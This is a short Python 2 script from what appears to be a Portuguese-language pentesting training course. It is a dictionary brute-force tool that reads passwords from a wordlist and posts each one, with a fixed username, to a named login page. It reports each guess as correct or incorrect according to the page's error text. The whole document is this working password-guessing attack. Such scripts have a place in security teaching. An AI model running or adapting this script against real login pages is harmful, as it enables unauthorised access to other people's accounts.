#####################################
# Python para Pentesters            #
# https://solyd.com.br/treinamentos #
#####################################

import requests

url = 'http://ensino.solyd.com.br/login/index.php'

arquivo = open('dicionario.txt')
linhas = arquivo.readlines()

for linha in linhas:
    dados = {'username': 'example@example.com',
             'password': linha}

    resposta = requests.post(url, data=dados)

    if "senha errados" in resposta.text:
        print "Senha incorreta:", linha
    else:
        print "Senha correta:", linha
